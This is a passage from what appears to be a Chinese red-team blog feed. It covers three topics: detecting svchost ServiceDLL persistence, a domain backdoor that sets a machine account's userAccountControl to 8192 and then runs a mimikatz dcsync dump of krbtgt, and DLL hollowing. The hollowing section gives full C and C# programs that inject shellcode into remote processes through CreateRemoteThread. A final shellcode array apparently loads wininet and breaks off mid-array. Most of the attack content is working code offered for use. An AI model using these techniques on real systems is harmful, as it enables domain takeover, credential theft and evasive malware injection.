src="https://s4.ax1x.com/2022/01/16/7YH7od.png" alt=""></p><p>检测技术</p><pre><code>* 最近创建的服务svchost.exe作为binPath* 列出所有系统服务的ServiceDLL值并检测</code></pre><pre><code>Get-ItemProperty hklm:\SYSTEM\ControlSet001\Services\*\Parameters | ? { $_.servicedll } | select psparentpath, servicedll</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHXSP.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;工作原理&quot;&gt;&lt;a href=&quot;#工作原理&quot; class=&quot;headerlink&quot; title=&quot;工作原理&quot;&gt;&lt;/a&gt;工作原理&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://s4.ax1x.com/2022/01/16/7YH6o9.png&quot; alt=&quot;&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>userAccountControl将ID设置为8192作为后门</title>
    <link href="http://422926799.github.io/posts/a984f0cd.html"/>
    <id>http://422926799.github.io/posts/a984f0cd.html</id>
    <published>2022-01-15T17:02:29.000Z</published>
    <updated>2022-01-15T17:25:17.889Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>来源推特：<br><img src="https://s4.ax1x.com/2022/01/16/7YTx9P.png" alt=""></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>YAYI.local - Windows Server 2012 - DC<br>YAYI.local - Windows 7 - 域机器(WIN-BMIO66D4K15)</p><p>在域控机器执行</p><pre><code>powershell下运行如果要在非DC下执行需要执行命令:Import-Module Microsoft.ActiveDirectory.Management.dll #导入Microsoft.ActiveDirectory.Management.dll#添加机器账户New-ADComputer -Name ATTACKER10 -AccountPassword (ConvertTo-SecureString -String &quot;Hjk123456!&quot; -Force -AsPlainText)#设置机器账户的userAccountControl (需要域管权限)$ADComputer=Get-ADComputer -Identity ATTACKER10Set-ADObject -Identity $ADComputer -Replace @{userAccountControl=8192}#查询域DC机器Get-ADGroupMember -Identity &quot;Domain Controllers&quot;</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHPxK.png" alt=""></p><p>域内机器执行dcsync dump</p><pre><code>(需要等待几分钟)mimikatz:lsadump::dcsync /user:krbtgt</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHeIA.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/16/7YHlM8.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;来源推特：&lt;br&gt;&lt;img src=&quot;https://s4.ax1x.com/2022/01/16/7YTx9P.png&quot; alt=&quot;&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>DLL镂空不使用Loadlibrary</title>
    <link href="http://422926799.github.io/posts/c34749bd.html"/>
    <id>http://422926799.github.io/posts/c34749bd.html</id>
    <published>2022-01-15T16:41:30.000Z</published>
    <updated>2022-01-15T16:56:12.191Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>被几个吊毛同事催着更博客，立刻更了一篇 (</p><h2 id="利用NtMapViewOfSection来加载DLL"><a href="#利用NtMapViewOfSection来加载DLL" class="headerlink" title="利用NtMapViewOfSection来加载DLL"></a>利用NtMapViewOfSection来加载DLL</h2><p>看到一遍文章，利用NtMapViewOfSection来加载DLL。不使用LoadLibrary来加载DLL复现了一下<br>NtMapViewOfSection，之前复现过NtCreateSection + NtMapViewOfSection 代码注入。当时没有好好的看NtMapViewOfSection这个API函数。顺便记录一下<br>ZwCreateSection</p><pre><code>NTSYSAPI NTSTATUS ZwCreateSection(  [out]          PHANDLE            SectionHandle,  [in]           ACCESS_MASK        DesiredAccess,  [in, optional] POBJECT_ATTRIBUTES ObjectAttributes,  [in, optional] PLARGE_INTEGER     MaximumSize,  [in]           ULONG              SectionPageProtection,  [in]           ULONG              AllocationAttributes,  [in, optional] HANDLE             FileHandle);</code></pre><p>ZwMapViewOfSection</p><pre><code>NTSYSAPI NTSTATUS ZwMapViewOfSection(  [in]                HANDLE          SectionHandle,  [in]                HANDLE          ProcessHandle,  [in, out]           PVOID           *BaseAddress,  [in]                ULONG_PTR       ZeroBits,  [in]                SIZE_T          CommitSize,  [in, out, optional] PLARGE_INTEGER  SectionOffset,  [in, out]           PSIZE_T         ViewSize,  [in]                SECTION_INHERIT InheritDisposition,  [in]                ULONG           AllocationType,  [in]                ULONG           Win32Protect);</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YIWDJ.png" alt=""></p><p>NtMapViewOfSection可以共享进程之间的内存。类似于下图<br><img src="https://s4.ax1x.com/2022/01/16/7YIfb9.png" alt=""></p><p>文章里的介绍<br><img src="https://s4.ax1x.com/2022/01/16/7YI4ER.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YII4x.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YIbvD.png" alt=""></p><p>Demo1<br>利用tMapViewOfSection代替VirtualAllocEx和WriteProcessMemory，将要Load的DLL路径写入远程的进程</p><pre><code class="C">// demo.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;Windows.h&gt;#include &lt;iostream&gt;#include &lt;psapi.h&gt;#pragma comment(lib, &quot;ntdll&quot;)#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,GetLastError());}typedef struct _LSA_UNICODE_STRING { USHORT Length;  USHORT MaximumLength; PWSTR  Buffer;  } UNICODE_STRING, * PUNICODE_STRING;typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING   ObjectName; ULONG Attributes; PVOID SecurityDescriptor;     PVOID   SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, *  PCLIENT_ID;using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG   DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER   MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE   FileHandle OPTIONAL);using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle,  PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,  PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN   PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG   StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID   StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID   ClientID);myNtCreateSection fNtCreateSection =  (myNtCreateSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtCreateSection&quot;));myNtMapViewOfSection fNtMapViewOfSection =  (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtMapViewOfSection&quot;));myRtlCreateUserThread fRtlCreateUserThread =  (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;RtlCreateUserThread&quot;));unsigned char buf[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;&quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;&quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;&quot;\x63\x2e\x65\x78\x65\x00&quot;;int main(){    HANDLE sectionHandle = NULL;    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;    SIZE_T size = 4096;    INT PID = 23164;    LARGE_INTEGER sectionSize = { size };    TCHAR moduleName[] = L&quot;C:\\Windows\\System32\\xwreg.dll&quot;;    HMODULE hmodules[MAX_PATH] = {};    DWORD hmodulesize = sizeof(hmodules);    DWORD hmodulesizeneeded = 0;    HMODULE rmodule = NULL;    CHAR rmoduleName[MAX_PATH] = {};    fNtCreateSection(&amp;sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE |  SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&amp;sectionSize, PAGE_EXECUTE_READWRITE,  SEC_COMMIT, NULL);    fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &amp;localSectionAddress, NULL,  NULL, NULL, &amp;size, 2, NULL, PAGE_READWRITE);    printf(&quot;LocalAddress:0x%x\n&quot;, localSectionAddress);    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);    if (hprocess == NULL) {        errorprint(&quot;OpenProcess&quot;);    }    fNtMapViewOfSection(sectionHandle, hprocess, &amp;remoteSectionAddress, NULL, NULL, NULL,  &amp;size, 2, NULL, PAGE_READWRITE);    printf(&quot;remoteSectionAddress:0x%x\n&quot;, remoteSectionAddress);    memcpy(localSectionAddress, moduleName, sizeof(moduleName));    PTHREAD_START_ROUTINE loadaddress =  (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA(&quot;Kernel32&quot;), &quot;LoadLibraryW&quot;);    printf(&quot;LoadLibraryA Address:0x%x\n&quot;, loadaddress);    HANDLE dllThread = CreateRemoteThread(hprocess, NULL, 0, loadaddress,  remoteSectionAddress, 0, NULL); //远程线程调用LoadlibraryW函数加载xwreg.dll    WaitForSingleObject(dllThread, 1000); //休眠10秒    EnumProcessModules(hprocess, hmodules, hmodulesize, &amp;hmodulesizeneeded); //获取进程加载的所有模块句柄数量    for (int calc = 0; calc &lt; (hmodulesizeneeded / sizeof(HMODULE)); calc++) {        rmodule = hmodules[calc];        GetModuleBaseNameA(hprocess, rmodule, rmoduleName, sizeof(rmoduleName)); //获取模块名称        if (strcmp(rmoduleName, &quot;xwreg.dll&quot;) == 0) {            break;        }    }    printf(&quot;%s %x\n&quot;, rmoduleName, rmodule);    DWORD headerbuffersize = 0x1000;    LPVOID peHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerbuffersize);    ReadProcessMemory(hprocess, rmodule, peHeader, headerbuffersize, NULL); //读取dll pe地址    PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)peHeader; //dll DOS头    PIMAGE_NT_HEADERS ntheader = (PIMAGE_NT_HEADERS)((DWORD_PTR)peHeader +  dosheader-&gt;e_lfanew); //dll BaseAddress+文件相对偏移地址=ntaddress    LPVOID dllEntryPoint = (LPVOID)(ntheader-&gt;OptionalHeader.AddressOfEntryPoint +  (DWORD_PTR)rmodule); //入口点指针地址+指定dll基地址=模块入口点    WriteProcessMemory(hprocess, dllEntryPoint, (LPVOID)buf, sizeof(buf), NULL); //写入shellcode    CreateRemoteThread(hprocess, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint,  NULL, 0, NULL); //远程线程启动    return 0;}</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YIODH.png" alt=""></p><p>Demo2<br>利用tMapViewOfSection代替LoadLibrary加载DLL</p><pre><code class="C">// demo.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;Windows.h&gt;#include &lt;iostream&gt;#include &lt;psapi.h&gt;#include &lt;tlhelp32.h&gt;#pragma comment(lib, &quot;ntdll&quot;)#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,GetLastError());}#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)typedef struct _LSA_UNICODE_STRING { USHORT Length;  USHORT MaximumLength; PWSTR  Buffer;  } UNICODE_STRING, * PUNICODE_STRING;typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING   ObjectName; ULONG Attributes; PVOID SecurityDescriptor;     PVOID   SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, *  PCLIENT_ID;typedef enum _SECTION_INHERIT{    ViewShare = 1,    ViewUnmap = 2} SECTION_INHERIT, * PSECTION_INHERIT;using myNtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle, IN ULONG   DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN PLARGE_INTEGER   MaximumSize OPTIONAL, IN ULONG PageAttributess, IN ULONG SectionAttributes, IN HANDLE   FileHandle OPTIONAL);using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle,  PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,  PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);using myRtlCreateUserThread = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle, IN   PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL, IN BOOLEAN CreateSuspended, IN ULONG   StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID   StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID   ClientID);myNtCreateSection fNtCreateSection =  (myNtCreateSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtCreateSection&quot;));myNtMapViewOfSection fNtMapViewOfSection =  (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;NtMapViewOfSection&quot;));myRtlCreateUserThread fRtlCreateUserThread =  (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA(&quot;ntdll&quot;), &quot;RtlCreateUserThread&quot;));unsigned char buf[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;&quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;&quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;&quot;\x63\x2e\x65\x78\x65\x00&quot;;PVOID map_dll_image(HANDLE hSection, HANDLE hProcess, DWORD protect) //传入文件映射对象、进程句柄、页面可读可写权限{    NTSTATUS                  status;    PVOID                             sectionBaseAddress;    SIZE_T                            viewSize;    SECTION_INHERIT           inheritDisposition;    if (hProcess == NULL)        return NULL;    // NtMapViewOfSection always fail when you specify a desired base address    sectionBaseAddress = NULL;    viewSize = 0;    inheritDisposition = ViewShare;    status = fNtMapViewOfSection((HANDLE)hSection, //文件映射对象        (HANDLE)hProcess, //进程句柄        (PVOID*)&amp;sectionBaseAddress, //接收返回基址        (ULONG_PTR)NULL,        (SIZE_T)NULL,        (PLARGE_INTEGER)NULL,        &amp;viewSize, //从SectionOffset开始并继续到该部分末尾的部分的视图范围+1        inheritDisposition,        (ULONG)PtrToUlong(NULL),        (ULONG)protect); //页面权限修改    if (!NT_SUCCESS(status)) {        printf(&quot;NtMapViewOfSection: 0x%x\n&quot;, status);        return NULL;    }    return sectionBaseAddress; //返回修改后的基址}int main(){    HANDLE hSection = NULL;    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;    SIZE_T size = 4096;    INT PID = 24552;    LARGE_INTEGER sectionSize = { size };    TCHAR moduleName[] = L&quot;C:\\Windows\\System32\\xwreg.dll&quot;;    HMODULE hmodules[MAX_PATH] = {};    DWORD hmodulesize = sizeof(hmodules);    DWORD hmodulesizeneeded = 0;    HANDLE hFile = NULL;    NTSTATUS status = 0;    DWORD protect = 0x0;    BYTE* mapped = NULL;    hFile = CreateFileW(moduleName, GENERIC_READ, 0, NULL, OPEN_EXISTING,  FILE_ATTRIBUTE_NORMAL, NULL);    status = fNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY,  SEC_IMAGE, hFile);    if (!NT_SUCCESS(status)) {        printf(&quot;NtCreateSection: 0x%x\n&quot;, status);        CloseHandle(hFile);        return NULL;    }    printf(&quot;Section created - hSection = 0x%x\n&quot;, hSection);    HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, PID);    if (hprocess == NULL) {        errorprint(&quot;OpenProcess&quot;);    }    protect = PAGE_READWRITE;    mapped = (BYTE*)map_dll_image(hSection, hprocess, protect);    if (mapped == NULL) {        CloseHandle(hSection);        CloseHandle(hFile);        return NULL;    }    printf(&quot;Load DLL:%s 0x%x\n&quot;, moduleName, mapped);    DWORD headerbuffersize = 0x1000;    LPVOID peHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerbuffersize);    ReadProcessMemory(hprocess, mapped, peHeader, headerbuffersize, NULL); //读取dll pe地址    PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)peHeader; //dll DOS头    PIMAGE_NT_HEADERS ntheader = (PIMAGE_NT_HEADERS)((DWORD_PTR)peHeader +  dosheader-&gt;e_lfanew); //dll BaseAddress+文件相对偏移地址=ntaddress    LPVOID dllEntryPoint = (LPVOID)(ntheader-&gt;OptionalHeader.AddressOfEntryPoint +  (DWORD_PTR)mapped); //入口点指针地址+指定dll基地址=模块入口点    WriteProcessMemory(hprocess, dllEntryPoint, (LPVOID)buf, sizeof(buf), NULL); //写入shellcode    CreateRemoteThread(hprocess, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0,  NULL); //远程线程启动    return 0;}</code></pre><p>NtMapViewOfSection加载DLL:<br><img src="https://s4.ax1x.com/2022/01/16/7YIvVA.png" alt=""></p><p>执行结果如下：<br><img src="https://s4.ax1x.com/2022/01/16/7YIz5t.png" alt=""></p><p>也可以按照文章里的，获取到DLL后。直接申请权限可读、可写然后写入shellcode在远程线程调用。不过改来改去太敏感了<br><img src="https://s4.ax1x.com/2022/01/16/7YopPP.png" alt=""></p><p>该文章的POC思路如下：</p><pre><code>1. 获取系统根目录2. 搜索根目录里的DLL3.判断DLL的PE大小是否小于shellcode大小    1. 如果小于则返回该DLL的路径4. 检测是否要绕过CFG （Win10 执行流保护）5. NtMapViewOfSection加载DLL6. 更改权限写入shellcode7. 远程线程调用</code></pre><p>参考链接:<br><a href="https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/" target="_blank" rel="noopener">https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/</a><br><a href="https://github.com/SECFORCE/DLL-Hollow-PoC" target="_blank" rel="noopener">https://github.com/SECFORCE/DLL-Hollow-PoC</a><br><a href="https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection" target="_blank" rel="noopener">https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection</a></p><h2 id="DLL-txt区段插入shellcode用CreateRemoteThread调用"><a href="#DLL-txt区段插入shellcode用CreateRemoteThread调用" class="headerlink" title="DLL .txt区段插入shellcode用CreateRemoteThread调用"></a>DLL .txt区段插入shellcode用CreateRemoteThread调用</h2><p>注意事项：</p><pre><code>* x64只能注x64的进程，x86只能插x86的进程。对应进程位数带有下面的两个dll，需要根据位数来注入</code></pre><p>最近两天有更简单粗暴的方法，找一个DLL .txt区段插入shellcode用CreateRemoteThread调用。进程不会崩溃的<br>原文链接:<a href="https://www.netero1010-securitylab.com/eavsion/alternative-process-injection" target="_blank" rel="noopener">https://www.netero1010-securitylab.com/eavsion/alternative-process-injection</a><br>测试了一下win10稳定加载shellcode 进程不会崩溃的两个DLL</p><pre><code>* uxtheme.dll* msvcp_win.dll</code></pre><p>csharp</p><pre><code class="cshap">using System;using System.Diagnostics;using System.Runtime.InteropServices;namespace AnotherDLLHollowing{    class Program    {        [DllImport(&quot;kernel32.dll&quot;)]        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);        [DllImport(&quot;kernel32.dll&quot;)]        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);        [DllImport(&quot;kernel32.dll&quot;)]        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);        static void Main(string[] args)        {            int pid = Process.GetProcessesByName(&quot;notepad&quot;)[0].Id;byte[] buf = new byte[276] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };            Process processObj = Process.GetProcessById(pid);            foreach (ProcessModule module in processObj.Modules)            {                if (module.FileName.ToLower().Contains(&quot;gdi32full.dll&quot;))                {                    IntPtr addr = module.BaseAddress + 4096;                    Console.WriteLine(&quot;DLL BaseAddress:&quot;+addr);                    IntPtr outSize;                    uint oldProtect;                    VirtualProtectEx(processObj.Handle, addr, (UIntPtr)buf.Length, 0x04, out oldProtect);                    WriteProcessMemory(processObj.Handle, addr, buf, buf.Length, out outSize);                    VirtualProtectEx(processObj.Handle, addr, (UIntPtr)buf.Length, 0x20, out oldProtect);                    IntPtr hThread = CreateRemoteThread(processObj.Handle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x0, out hThread);                    break;                }            }        }    }}</code></pre><p>C<br>示例代码:</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;psapi.h&gt;#include &lt;tlhelp32.h&gt;unsigned char buf[] =  &quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41